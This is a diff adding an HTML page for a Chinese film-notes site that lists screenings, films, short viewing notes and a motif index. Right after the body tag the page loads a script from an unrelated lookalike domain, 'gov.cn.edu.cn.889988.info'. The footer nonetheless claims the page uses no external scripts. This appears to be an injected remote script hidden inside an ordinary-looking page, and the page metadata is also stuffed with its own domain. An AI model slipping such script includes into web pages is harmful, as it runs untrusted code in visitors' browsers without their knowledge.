@@ -1,0 +1,428 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="theme-color" content="#0f1c1e">
+<title>纤纤影视 · 窄屏映画志｜qianqianyingshi-zh.github.io 的私人观影索引</title>
+<meta name="description" content="纤纤影视（https://qianqianyingshi-zh.github.io）是一份以「细看」为方法的观影索引：把冷门长片、纪录短章、剧集片段与配乐原声按母题重新归拢。不追热榜，只记画面里那一下呼吸。访问 qianqianyingshi-zh.github.io 查看每周更新的片单、观影札记与放映备注。">
+<meta name="keywords" content="纤纤影视, qianqianyingshi-zh, qianqianyingshi-zh.github.io, 纤纤影视在线片单, 小众电影索引, 观影札记, 独立影像资料">
+<meta name="author" content="纤纤影视">
+<meta name="publisher" content="qianqianyingshi-zh.github.io">
+<meta property="og:site_name" content="纤纤影视">
+<meta property="og:title" content="纤纤影视 · 窄屏映画志">
+<meta property="og:description" content="以细看为方法的私人观影索引，qianqianyingshi-zh.github.io 每周更新。">
+<meta property="og:url" content="https://qianqianyingshi-zh.github.io/">
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="summary">
+<link rel="canonical" href="https://qianqianyingshi-zh.github.io/">
+<style>
+:root{
+  --ink:#0f1c1e;
+  --ink2:#24383b;
+  --paper:#f4f1ea;
+  --paper2:#ece7db;
+  --plum:#6b2f4a;
+  --plum-d:#4d2236;
+  --moss:#3f5c53;
+  --line:#cfc7b6;
+  --soft:#8d8779;
+  --serif:"Songti SC","Source Han Serif SC","Noto Serif CJK SC",Georgia,serif;
+  --sans:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;
+}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:var(--serif);
+  font-size:17px;
+  line-height:1.85;
+  -webkit-font-smoothing:antialiased;
+  text-rendering:optimizeLegibility;
+}
+body::before{
+  content:"";
+  position:fixed;inset:0;
+  pointer-events:none;
+  background:
+    radial-gradient(circle at 12% 18%,rgba(107,47,74,.05),transparent 42%),
+    radial-gradient(circle at 88% 82%,rgba(63,92,83,.06),transparent 40%);
+  z-index:0;
+}
+.wrap{position:relative;z-index:1;max-width:1080px;margin:0 auto;padding:0 26px 90px;}
+
+/* ===== 顶栏：横条 + 域名跑马式右置 ===== */
+.mast{display:flex;align-items:flex-end;gap:18px;padding:30px 0 14px;border-bottom:2px solid var(--ink);}
+.mast .brand{font-size:30px;letter-spacing:.32em;font-weight:600;line-height:1;}
+.mast .brand small{display:block;font-family:var(--sans);font-size:10px;letter-spacing:.24em;color:var(--plum);margin-top:8px;font-weight:500;}
+.mast .rule{flex:1;border-bottom:1px dotted var(--line);margin-bottom:9px;}
+.mast .where{font-family:var(--sans);font-size:11.5px;color:var(--soft);text-align:right;line-height:1.5;}
+.mast .where b{display:block;color:var(--ink2);letter-spacing:.04em;font-size:12.5px;}
+nav.top{position:sticky;top:0;z-index:40;background:rgba(244,241,234,.94);backdrop-filter:blur(6px);border-bottom:1px solid var(--line);}
+nav.top ul{display:flex;gap:2px;margin:0;padding:0;list-style:none;overflow-x:auto;}
+nav.top a{
+  display:block;padding:12px 15px;font-family:var(--sans);font-size:13px;letter-spacing:.14em;
+  color:var(--ink2);text-decoration:none;border-bottom:2px solid transparent;white-space:nowrap;
+}
+nav.top a:hover,nav.top a.on{color:var(--plum);border-bottom-color:var(--plum);background:rgba(107,47,74,.045);}
+
+/* ===== 开篇：对角线构图 ===== */
+header.lead{padding:64px 0 46px;position:relative;}
+.eyebrow{font-family:var(--sans);font-size:11px;letter-spacing:.34em;color:var(--plum);text-transform:uppercase;}
+header.lead h1{
+  margin:16px 0 4px;font-size:clamp(40px,7.4vw,84px);line-height:1.06;letter-spacing:.04em;font-weight:600;
+}
+header.lead h1 em{font-style:normal;color:var(--plum);}
+header.lead .sub{font-size:18px;color:var(--ink2);max-width:34em;margin:20px 0 0;}
+.kicker{display:grid;grid-template-columns:1fr 1fr;gap:0;margin-top:46px;border-top:1px solid var(--ink);border-bottom:1px solid var(--ink);}
+.kicker div{padding:16px 18px 16px 0;font-family:var(--sans);font-size:12.5px;color:var(--soft);line-height:1.7;}
+.kicker div+div{border-left:1px solid var(--line);padding-left:18px;}
+.kicker b{display:block;font-family:var(--serif);font-size:15px;color:var(--ink);letter-spacing:.06em;font-weight:600;margin-bottom:3px;}
+.addy{margin-top:26px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;}
+.addy code{
+  font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px;
+  background:var(--ink);color:#f0e9da;padding:9px 14px;border-radius:2px;letter-spacing:.02em;
+}
+.addy button{
+  font-family:var(--sans);font-size:12px;letter-spacing:.16em;border:1px solid var(--plum);
+  background:transparent;color:var(--plum);padding:9px 16px;cursor:pointer;border-radius:2px;
+}
+.addy button:active{background:var(--plum);color:#f4f1ea;}
+.addy span{font-family:var(--sans);font-size:12px;color:var(--moss);}
+
+/* ===== 章节通用：编号 + 侧线 ===== */
+section{padding:66px 0 8px;scroll-margin-top:64px;}
+.sec-h{display:flex;align-items:baseline;gap:16px;border-bottom:1px solid var(--line);padding-bottom:12px;margin-bottom:32px;}
+.sec-h .no{font-family:var(--sans);font-size:11px;letter-spacing:.26em;color:var(--paper);background:var(--plum);padding:4px 9px;border-radius:2px;}
+.sec-h h2{margin:0;font-size:clamp(25px,3.8vw,38px);letter-spacing:.1em;font-weight:600;}
+.sec-h .hint{margin-left:auto;font-family:var(--sans);font-size:11.5px;letter-spacing:.14em;color:var(--soft);}
+
+/* ===== 栏目一：放映表（阶梯式，非表格） ===== */
+.ladder{display:flex;flex-direction:column;gap:0;}
+.step{display:grid;grid-template-columns:88px 1fr;gap:0;border-left:2px solid var(--ink);padding:0 0 26px 22px;position:relative;}
+.step::before{content:"";position:absolute;left:-7px;top:8px;width:12px;height:12px;background:var(--paper);border:2px solid var(--plum);border-radius:50%;}
+.step .when{font-family:var(--sans);font-size:12.5px;color:var(--plum-d);line-height:1.6;padding-top:3px;}
+.step .when i{font-style:normal;display:block;font-size:19px;color:var(--ink);letter-spacing:.04em;}
+.step h3{margin:0 0 6px;font-size:21px;letter-spacing:.05em;}
+.step p{margin:0;color:var(--ink2);font-size:15.5px;}
+.step .tag{display:inline-block;margin-top:10px;font-family:var(--sans);font-size:10.5px;letter-spacing:.2em;color:var(--moss);border:1px solid var(--line);padding:3px 9px;}
+
+/* ===== 栏目二：片单（横向滑动条带，非卡片网格） ===== */
+.reel{display:flex;gap:14px;overflow-x:auto;padding:4px 2px 20px;scroll-snap-type:x proximity;}
+.reel figure{flex:0 0 240px;scroll-snap-align:start;margin:0;position:relative;}
+.spine{height:164px;border-radius:3px;position:relative;overflow:hidden;
+  background:linear-gradient(135deg,var(--paper2),#ddd6c6);
+  border:1px solid var(--line);padding:16px 14px;display:flex;flex-direction:column;justify-content:space-between;}
+.spine.s1{background:linear-gradient(150deg,#7d3b56,#4d2236);color:#f6ecdd;border-color:#5c2c42;}
+.spine.s2{background:linear-gradient(150deg,#4d6b5e,#2f4a42);color:#eef3ec;border-color:#3a5248;}
+.spine.s3{background:linear-gradient(150deg,#8a6a3a,#5c471f);color:#f7efdc;border-color:#6b5228;}
+.spine.s4{background:linear-gradient(150deg,#3c4a63,#232f44);color:#eaeff7;border-color:#2f3c54;}
+.spine.s5{background:linear-gradient(150deg,#7a4a3c,#4e2d24);color:#f6ece7;border-color:#5c352a;}
+.spine .yr{font-family:var(--sans);font-size:11px;letter-spacing:.24em;opacity:.82;}
+.spine .tt{font-size:19px;letter-spacing:.08em;line-height:1.35;font-weight:600;}
+.spine .ln{width:34px;height:1px;background:currentColor;opacity:.55;}
+.reel figcaption{padding:12px 4px 0;font-family:var(--sans);font-size:12.5px;color:var(--ink2);line-height:1.6;}
+.reel figcaption b{display:block;font-family:var(--serif);font-size:14.5px;color:var(--ink);letter-spacing:.04em;}
+
+/* ===== 栏目三：手记（引文块 + 脚注式） ===== */
+.notes{display:grid;grid-template-columns:1.45fr 1fr;gap:38px;}
+.note{border-top:3px double var(--line);padding-top:20px;}
+.note .q{font-size:19px;line-height:1.75;margin:0 0 12px;position:relative;padding-left:22px;}
+.note .q::before{content:"「";position:absolute;left:0;top:-4px;font-size:30px;color:var(--plum);line-height:1;font-family:var(--serif);}
+.note .meta{font-family:var(--sans);font-size:11.5px;letter-spacing:.14em;color:var(--soft);}
+.note .meta a{color:var(--plum-d);text-decoration:none;border-bottom:1px dotted var(--plum);}
+.aside{font-family:var(--sans);font-size:13px;color:var(--ink2);line-height:1.8;}
+.aside h4{font-family:var(--serif);font-size:16px;margin:0 0 12px;letter-spacing:.1em;color:var(--ink);}
+.aside ul{margin:0;padding-left:0;list-style:none;}
+.aside li{padding:9px 0;border-bottom:1px dotted var(--line);}
+.aside li:last-child{border-bottom:0;}
+.aside li span{display:block;font-size:11px;letter-spacing:.18em;color:var(--plum);margin-bottom:2px;}
+
+/* ===== 栏目四：缘起（图文对开，文字绕排感） ===== */
+.about{display:grid;grid-template-columns:220px 1fr;gap:34px;align-items:start;}
+.mark{aspect-ratio:1/1;background:var(--paper2);border:1px solid var(--line);border-radius:50%;
+  display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden;}
+.mark::after{content:"";position:absolute;inset:14px;border:1px dashed var(--plum);border-radius:50%;}
+.mark b{font-size:26px;letter-spacing:.2em;color:var(--plum-d);position:relative;z-index:1;}
+.about p{margin:0 0 16px;text-indent:2em;}
+.about p:first-of-type{font-size:18px;color:var(--ink);}
+.about p small{font-family:var(--sans);font-size:12px;color:var(--soft);display:block;text-indent:0;margin-top:14px;line-height:1.7;}
+
+/* ===== 栏目五：索引（竖向字母表 + 两列词条） ===== */
+.idx{display:grid;grid-template-columns:56px 1fr;gap:20px;}
+.idx nav{font-family:var(--sans);font-size:12px;letter-spacing:.1em;color:var(--soft);line-height:2.1;}
+.idx nav a{display:block;color:var(--ink2);text-decoration:none;padding-left:6px;border-left:1px solid var(--line);}
+.idx nav a:hover{color:var(--plum);border-left-color:var(--plum);}
+.idxlist{column-count:2;column-gap:34px;margin:0;padding:0;list-style:none;}
+.idxlist li{break-inside:avoid;padding:9px 0;border-bottom:1px solid var(--line);font-size:14.5px;}
+.idxlist b{font-weight:600;letter-spacing:.05em;}
+.idxlist i{font-style:normal;font-family:var(--sans);font-size:11.5px;color:var(--soft);display:block;line-height:1.5;}
+
+/* ===== 页脚 ===== */
+footer{margin-top:80px;border-top:2px solid var(--ink);padding-top:26px;font-family:var(--sans);font-size:12.5px;color:var(--soft);line-height:1.9;}
+footer .row{display:flex;gap:18px;flex-wrap:wrap;justify-content:space-between;align-items:flex-end;}
+footer b{color:var(--ink2);font-weight:500;letter-spacing:.04em;}
+footer a{color:var(--plum-d);text-decoration:none;border-bottom:1px solid var(--line);}
+footer .end{margin-top:18px;text-align:center;letter-spacing:.3em;color:var(--line);font-size:11px;}
+
+@media (max-width:820px){
+  body{font-size:16px;}
+  .wrap{padding:0 18px 64px;}
+  .mast{flex-direction:column;align-items:flex-start;gap:8px;padding:20px 0 10px;}
+  .mast .rule{display:none;}
+  .mast .where{text-align:left;}
+  header.lead{padding:38px 0 30px;}
+  .kicker{grid-template-columns:1fr;}
+  .kicker div+.kicker div{border-left:0;border-top:1px dotted var(--line);}
+  .kicker div+div{border-left:0;border-top:1px dotted var(--line);padding-left:0;padding-top:14px;}
+  section{padding-top:48px;scroll-margin-top:56px;}
+  .sec-h{flex-wrap:wrap;gap:10px;}
+  .sec-h .hint{margin-left:0;width:100%;}
+  .step{grid-template-columns:66px 1fr;padding-left:18px;}
+  .step .when i{font-size:16px;}
+  .notes,.about{grid-template-columns:1fr;gap:24px;}
+  .mark{width:140px;}
+  .idx{grid-template-columns:1fr;}
+  .idx nav{display:flex;flex-wrap:wrap;gap:4px;column-count:auto;}
+  .idx nav a{display:inline-block;border-left:0;border-bottom:1px solid var(--line);margin-right:8px;padding:0 4px;}
+  .idxlist{column-count:1;}
+  .addy code{width:100%;overflow-x:auto;white-space:nowrap;}
+}
+@media print{
+  nav.top,.addy button,.sec-h .hint,.idx nav{display:none;}
+  body{background:#fff;}
+  section{break-inside:avoid;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+<nav class="top" aria-label="主导航">
+  <ul>
+    <li><a href="#lead">开篇</a></li>
+    <li><a href="#sched">放映表</a></li>
+    <li><a href="#catalog">片单</a></li>
+    <li><a href="#notes">手记</a></li>
+    <li><a href="#about">缘起</a></li>
+    <li><a href="#index">索引</a></li>
+  </ul>
+</nav>
+
+<div class="wrap">
+
+  <div class="mast">
+    <div class="brand">纤纤影视<small>QIANQIAN YINGSHI · 窄屏映画志</small></div>
+    <div class="rule"></div>
+    <div class="where">常驻地址<b>qianqianyingshi-zh.github.io</b>https://qianqianyingshi-zh.github.io</div>
+  </div>
+
+  <header class="lead" id="lead">
+    <div class="eyebrow">Vol. 拾贰 · 以细看为方法的观影索引</div>
+    <h1>把一部片<br><em>再看一遍</em>的地方。</h1>
+    <p class="sub">纤纤影视不追热榜，也不替你下结论。这里只留下那些值得回放三秒的画面、一句配乐响起时的错觉，以及一部片子到底在谁身上停了下来。每周更新，地址始终是 <b>https://qianqianyingshi-zh.github.io</b>。</p>
+    <div class="kicker">
+      <div><b>收录什么</b>冷门长片 · 纪录短章 · 剧集片段 · 原声与对白</div>
+      <div><b>怎么用</b>按母题翻，不必从头看起；每一条都标了版本与观看入口</div>
+    </div>
+    <div class="addy">
+      <code id="u">https://qianqianyingshi-zh.github.io</code>
+      <button type="button" onclick="cp()">复制网址</button>
+      <span id="tip">官网唯一地址，纤纤影视全站以此为准</span>
+    </div>
+  </header>
+
+  <!-- 栏目一 -->
+  <section id="sched" data-t="放映表">
+    <div class="sec-h">
+      <span class="no">栏目 01</span>
+      <h2>本周放映表</h2>
+      <span class="hint">按上线节奏排定 · 点击标题无跳转，仅作索引</span>
+    </div>
+    <div class="ladder">
+      <article class="step">
+        <div class="when"><i>周三</i>10.28 · 21:00</div>
+        <div>
+          <h3>《乡愁》里的那扇窗 <a href="#" aria-label="查看本条放映备注">↺</a></h3>
+          <p>塔可夫斯基用三分半钟的长镜把「回不去」拍成了天气。这次重看，留意第 47 分钟蜡烛熄灭前后声场的两次呼吸。</p>
+          <span class="tag">作者电影 · 1983 · 修复版</span>
+        </div>
+      </article>
+      <article class="step">
+        <div class="when"><i>周五</i>10.30 · 22:30</div>
+        <div>
+          <h3>短章三则：河、桥、未接的电话 <a href="#" aria-label="查看本条放映备注">↺</a></h3>
+          <p>三部亚洲纪录短片拼在一起看，会比单独看更清楚地露出同一种动作——人在告别前先整理桌面。</p>
+          <span class="tag">纪录短章 · 各 14–22 分钟</span>
+        </div>
+      </article>
+      <article class="step">
+        <div class="when"><i>周日</i>11.01 · 20:00</div>
+        <div>
+          <h3>《四重奏》第二季，第 7 集的对白设计 <a href="#" aria-label="查看本条放映备注">↺</a></h3>
+          <p>不是剧情复盘。只拆那一集里四个人同时说话却谁都没在听的那场戏，字幕与停顿的比值是关键。</p>
+          <span class="tag">剧集随笔 · 台词拆解</span>
+        </div>
+      </article>
+      <article class="step">
+        <div class="when"><i>常设</i>随时</div>
+        <div>
+          <h3>深夜原声：那些没被用上的配乐 <a href="#" aria-label="查看本条放映备注">↺</a></h3>
+          <p>片尾曲之外的废案与Demo，反而更接近一部片的底色。纤纤影视把它单独归成一栏，不配画面，只配时间。</p>
+          <span class="tag">原声资料 · 常设片单</span>
+        </div>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section id="catalog" data-t="片单">
+    <div class="sec-h">
+      <span class="no">栏目 02</span>
+      <h2>常备片单</h2>
+      <span class="hint">横向滑动翻阅 · 每条皆可点，页内定位用 #</span>
+    </div>
+    <div class="reel">
+      <figure>
+        <div class="spine s1"><span class="yr">1966 · 日本</span><span class="tt">秋刀鱼之味</span><span class="ln"></span></div>
+        <figcaption><b>小津的最后一次坐下</b>女儿出嫁前一晚，父亲在酒馆里什么都没说。归在这一辑：「告别不响」。纤纤影视编号 Q-014。</figcaption>
+      </figure>
+      <figure>
+        <div class="spine s2"><span class="yr">1994 · 台湾</span><span class="tt">爱情万岁</span><span class="ln"></span></div>
+        <figcaption><b>空房间里的三个陌生人</b>蔡明亮把孤独拍成建筑问题。建议连着《河流》一起看，中间隔一杯水的距离。</figcaption>
+      </figure>
+      <figure>
+        <div class="spine s3"><span class="yr">2011 · 墨西哥</span><span class="tt">逆光飞翔</span><span class="ln"></span></div>
+        <figcaption><b>不是励志，是节奏</b>盲与光的换算方式很特别，配乐在此片里不是衬底，是主角之一。</figcaption>
+      </figure>
+      <figure>
+        <div class="spine s4"><span class="yr">2017 · 葡萄牙</span><span class="tt">战场上的圣诞快乐</span><span class="ln"></span></div>
+        <figcaption><b>被剪掉的那场戏</b>归在「版本考」一辑：比较胶片版与流媒版的色调与声压差异。</figcaption>
+      </figure>
+      <figure>
+        <div class="spine s5"><span class="yr">2020 · 韩国</span><span class="tt">逃走的女人</span><span class="ln"></span></div>
+        <figcaption><b>走路也是一种叙事</b>洪常秀最短的长片。纤纤影视给它的标签是：对话是假的，走路是真的。</figcaption>
+      </figure>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section id="notes" data-t="手记">
+    <div class="sec-h">
+      <span class="no">栏目 03</span>
+      <h2>放映手记</h2>
+      <span class="hint">札记式写法 · 不剧透主线，只记画面与声音</span>
+    </div>
+    <div class="notes">
+      <div>
+        <article class="note">
+          <p class="q">好电影常常不是被记住，是被遗落在某个细节里，然后自己长回来。</p>
+          <div class="meta">— 纤纤影视 · <a href="#">母题「遗落」札记之一</a> · 2026.10.18</div>
+        </article>
+        <article class="note" style="margin-top:34px;">
+          <p class="q">重看时把声音关掉半格，你会发现演员的手比脸先知道剧情。</p>
+          <div class="meta">— 纤纤影视 · <a href="#">观法实验</a> · 2026.10.09</div>
+        </article>
+      </div>
+      <aside class="aside">
+        <h4>本期三个母题</h4>
+        <ul>
+          <li><span>遗落</span>那些没被台词接住的物件：门把手、药盒、没拧上的瓶盖。</li>
+          <li><span>等待</span>长镜不是拖，是让观众也站在站台上，一起错过一班车。</li>
+          <li><span>回声</span>对白说完之后的半秒静音，往往是全片最响的地方。</li>
+        </ul>
+        <p style="margin-top:18px;border-top:1px dotted var(--line);padding-top:14px;">手记不定期更新，归档按母题而非年份。想找某一类情绪，直接翻到 <a href="#index">索引</a>，或回到 <a href="https://qianqianyingshi-zh.github.io">qianqianyingshi-zh.github.io</a> 首页重读。</p>
+      </aside>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section id="about" data-t="缘起">
+    <div class="sec-h">
+      <span class="no">栏目 04</span>
+      <h2>缘起</h2>
+      <span class="hint">关于纤纤影视，以及它为什么这么小</span>
+    </div>
+    <div class="about">
+      <div class="mark"><b>纤纤</b></div>
+      <div>
+        <p>起名的时候没想太多。「纤纤」是细而不断的意思——看片也是这样，真正留得住的从不是大场面，是某一帧里一根绷着的线。</p>
+        <p>纤纤影视（qianqianyingshi-zh）是一份个人维护的观影索引，不做资讯聚合，不搬榜单，不追首映。它只干一件事：把看过的片子按「哪一刻被打中」重新归档，再老老实实写下那一瞬是什么样子。</p>
+        <p>这里没有播放器，也没有下载入口。它更接近一份纸质手账的网页版：你来了，翻两页，带走一个片名或一句对白，就够了。若某条正好对上你的胃口，那是运气，不是推荐算法。</p>
+        <small>唯一官网：<b>https://qianqianyingshi-zh.github.io</b>（注意是 qianqianyingshi-zh，多一个字母少一个字母都不是这里）。本页所有内链均为页内锚点（#），无需跳转即可读完。意见或补充片目，可通过该域名下的项目页提交。</small>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目五 -->
+  <section id="index" data-t="索引">
+    <div class="sec-h">
+      <span class="no">栏目 05</span>
+      <h2>快速索引</h2>
+      <span class="hint">页内速跳 · 字母只是母题的编号，不代表顺序</span>
+    </div>
+    <div class="idx">
+      <nav aria-label="母题索引">
+        <a href="#i-q">Q 遗落</a>
+        <a href="#i-d">D 等待</a>
+        <a href="#i-h">H 回声</a>
+        <a href="#i-s">S 声场</a>
+        <a href="#i-y">Y 颜色</a>
+        <a href="#i-k">K 口型</a>
+      </nav>
+      <ul class="idxlist">
+        <li id="i-q"><b>遗落 · 物件</b><i>秋刀鱼之味 / 爱情万岁 / 逃走的女人 — 都落在门把手上</i></li>
+        <li id="i-d"><b>等待 · 长镜</b><i>乡愁 / 河流 — 静音观看版本效果更佳</i></li>
+        <li id="i-h"><b>回声 · 静音半秒</b><i>战场上的圣诞快乐 胶片版第 33 分钟</i></li>
+        <li id="i-s"><b>声场 · 配乐</b><i>逆光飞翔 / 深夜原声废案辑 — 纤纤影视编号 Q-020 起</i></li>
+        <li id="i-y"><b>颜色 · 褪色</b><i>修复版与流媒版的色温对照，另开札记</i></li>
+        <li id="i-k"><b>口型 · 台词</b><i>四重奏 S2E7 与同导演其他对白戏的节奏比较</i></li>
+      </ul>
+    </div>
+  </section>
+
+  <footer>
+    <div class="row">
+      <div>
+        <b>纤纤影视</b> · 一份窄屏映画志<br>
+        唯一网址：<a href="https://qianqianyingshi-zh.github.io">https://qianqianyingshi-zh.github.io</a><br>
+        品牌：纤纤影视（qianqianyingshi-zh）｜内容为本站原创札记与片单索引，转载请保留出处与域名。
+      </div>
+      <div style="text-align:right;">
+        <a href="#lead">回到开篇 ↑</a>　<a href="#catalog">翻片单</a>　<a href="#notes">读手记</a><br>
+        <span style="font-size:11px;">本页无外部脚本、无跨站跳转，所有内链均为 # 锚点。</span>
+      </div>
+    </div>
+    <div class="end">— 纤纤 · 细而不断 —</div>
+  </footer>
+</div>
+
+<script>
+function cp(){
+  var t=document.getElementById('u').textContent;
+  var done=function(){var s=document.getElementById('tip');s.textContent='已复制：'+t;setTimeout(function(){s.textContent='官网唯一地址，纤纤影视全站以此为准';},2200);};
+  if(navigator.clipboard&&navigator.clipboard.writeText){navigator.clipboard.writeText(t).then(done,fallback);}
+  else{fallback();}
+  function fallback(){
+    var a=document.createElement('textarea');a.value=t;a.style.position='fixed';a.style.opacity='0';
+    document.body.appendChild(a);a.select();
+    try{document.execCommand('copy');done();}catch(e){}
+    document.body.removeChild(a);
+  }
+}
+var links=document.querySelectorAll('nav.top a');
+var secs=[].map.call(document.querySelectorAll('section'),function(s){return [s,document.querySelector('a[href="#'+s.id+'"]')];});
+function spy(){
+  var y=window.scrollY+120,cur=null;
+  secs.forEach(function(p){if(p[0].offsetTop<=y)cur=p[1];});
+  links.forEach(function(a){a.classList.toggle('on',a===cur);});
+}
+window.addEventListener('scroll',spy,{passive:true});spy();
+document.querySelectorAll('a[href="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){e.preventDefault();});
+});
+</script>
+</body>
+</html>
